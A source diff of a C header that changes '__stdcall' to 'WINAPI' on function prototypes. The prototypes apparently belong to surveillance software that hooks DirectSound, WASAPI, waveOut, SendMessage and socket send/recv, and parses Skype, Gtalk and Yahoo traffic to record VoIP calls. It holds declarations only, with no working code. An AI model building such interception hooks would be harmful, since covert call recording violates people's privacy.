@@ -168,7 +168,7 @@ extern DSGetCPStruct DSGetCPData;
 				                         wave_ptr += MAX_MSG_LEN; \
 									     to_write -= MAX_MSG_LEN; }}}
 
-DWORD __stdcall PM_DSGetCP(DWORD class_ptr,
+DWORD WINAPI PM_DSGetCP(DWORD class_ptr,
 	DWORD* write_c,
 	DWORD* play_c);
 DWORD PM_DSGetCP_setup(HMServiceStruct* pData);
@@ -193,7 +193,7 @@ typedef struct {
 
 extern DSCapGetCPStruct DSCapGetCPData;
 
-DWORD __stdcall PM_DSCapGetCP(DWORD class_ptr,
+DWORD WINAPI PM_DSCapGetCP(DWORD class_ptr,
 	DWORD* write_c,
 	DWORD* play_c);
 DWORD PM_DSCapGetCP_setup(HMServiceStruct* pData);
@@ -221,7 +221,7 @@ typedef struct {
 
 extern WASAPIGetBufferStruct WASAPIGetBufferData;
 
-HRESULT __stdcall PM_WASAPIGetBuffer(BYTE* class_ptr,
+HRESULT WINAPI PM_WASAPIGetBuffer(BYTE* class_ptr,
 	DWORD NumFramesRequested,
 	BYTE** ppData);
 
@@ -236,7 +236,7 @@ typedef struct {
 } WASAPIReleaseBufferStruct;
 extern WASAPIReleaseBufferStruct WASAPIReleaseBufferData;
 
-HRESULT __stdcall PM_WASAPIReleaseBuffer(BYTE* class_ptr,
+HRESULT WINAPI PM_WASAPIReleaseBuffer(BYTE* class_ptr,
 	DWORD NumFramesWrittem,
 	DWORD Flags);
 
@@ -256,7 +256,7 @@ typedef struct {
 
 extern waveOutWriteStruct waveOutWriteData;
 
-DWORD __stdcall PM_waveOutWrite(HWAVEOUT ARG1,
+DWORD WINAPI PM_waveOutWrite(HWAVEOUT ARG1,
 	WAVEHDR* WaveHdr,
 	DWORD ARG3);
 
@@ -274,7 +274,7 @@ typedef struct {
 
 extern waveInUnprepareHeaderStruct waveInUnprepareHeaderData;
 
-DWORD __stdcall PM_waveInUnprepareHeader(HWAVEOUT ARG1,
+DWORD WINAPI PM_waveInUnprepareHeader(HWAVEOUT ARG1,
 	WAVEHDR* WaveHdr,
 	DWORD ARG3);
 
@@ -306,7 +306,7 @@ typedef struct {
 } SendMessageStruct;
 extern SendMessageStruct SendMessageData;
 
-LRESULT __stdcall PM_SendMessage(HWND hWnd,
+LRESULT WINAPI PM_SendMessage(HWND hWnd,
 	UINT Msg,
 	WPARAM wParam,
 	LPARAM lParam,
@@ -327,12 +327,12 @@ typedef struct {
 } RecvStruct;
 extern RecvStruct RecvData;
 
-int __stdcall PM_Recv(SOCKET s,
+int WINAPI PM_Recv(SOCKET s,
 	char* buf,
 	int len,
 	int flags);
 
-int __stdcall PM_Send(SOCKET s,
+int WINAPI PM_Send(SOCKET s,
 	char* buf,
 	int len,
 	int flags);
@@ -436,20 +436,20 @@ BOOL ParseGtalkMsg(BYTE* msg, DWORD* pdwLen, DWORD* pdwFlags);
 BOOL ParseYahooMsg(BYTE* msg, DWORD* pdwLen, DWORD* pdwFlags);
 BOOL ParseSkypeMsg(BYTE* msg, DWORD* pdwLen, DWORD* pdwFlags);
 BOOL ParseSamplingMsg(BYTE* msg, DWORD* pdwLen, DWORD* pdwFlags);
-DWORD __stdcall PM_VoipRecordDispatch(BYTE* msg, DWORD dwLen, DWORD dwFlags, FILETIME* time_nanosec);
-DWORD __stdcall PM_VoipRecordStartStop(BOOL bStartFlag, BOOL bReset);
-DWORD __stdcall PM_VoipRecordInit(JSONObject elem);
-DWORD __stdcall PM_VoipRecordUnregister();
+DWORD WINAPI PM_VoipRecordDispatch(BYTE* msg, DWORD dwLen, DWORD dwFlags, FILETIME* time_nanosec);
+DWORD WINAPI PM_VoipRecordStartStop(BOOL bStartFlag, BOOL bReset);
+DWORD WINAPI PM_VoipRecordInit(JSONObject elem);
+DWORD WINAPI PM_VoipRecordUnregister();
 void PM_VoipRecordRegister();
 
-HRESULT __stdcall PM_WASAPICaptureGetBuffer(BYTE* class_ptr,
+HRESULT WINAPI PM_WASAPICaptureGetBuffer(BYTE* class_ptr,
 	BYTE** ppData,
 	UINT32* pNumFramesToRead,
 	DWORD* pdwFlags,
 	UINT64* pu64DevicePosition,
 	UINT64* pu64QPCPosition);
 
-HRESULT __stdcall PM_WASAPICaptureGetBufferMSN(BYTE* class_ptr,
+HRESULT WINAPI PM_WASAPICaptureGetBufferMSN(BYTE* class_ptr,
 	BYTE** ppData,
 	UINT32* pNumFramesToRead,
 	DWORD* pdwFlags,
@@ -459,11 +459,11 @@ HRESULT __stdcall PM_WASAPICaptureGetBufferMSN(BYTE* class_ptr,
 DWORD PM_WASAPICaptureGetBuffer_setup(HMServiceStruct* pData);
 
 DWORD PM_WASAPICaptureGetBufferMSN_setup(HMServiceStruct* pData);
-HRESULT __stdcall PM_WASAPICaptureReleaseBuffer(BYTE* class_ptr,
+HRESULT WINAPI PM_WASAPICaptureReleaseBuffer(BYTE* class_ptr,
 	DWORD NumFramesWrittem);
-HRESULT __stdcall PM_WASAPICaptureReleaseBufferMSN(BYTE* class_ptr,
+HRESULT WINAPI PM_WASAPICaptureReleaseBufferMSN(BYTE* class_ptr,
 	DWORD NumFramesWrittem);
-HRESULT __stdcall PM_WASAPICaptureReleaseBufferMSN(BYTE* class_ptr,
+HRESULT WINAPI PM_WASAPICaptureReleaseBufferMSN(BYTE* class_ptr,
 	DWORD NumFramesWrittem);
 DWORD PM_WASAPICaptureReleaseBuffer_setup(HMServiceStruct* pData);
 DWORD PM_WASAPICaptureReleaseBufferMSN_setup(HMServiceStruct* pData);
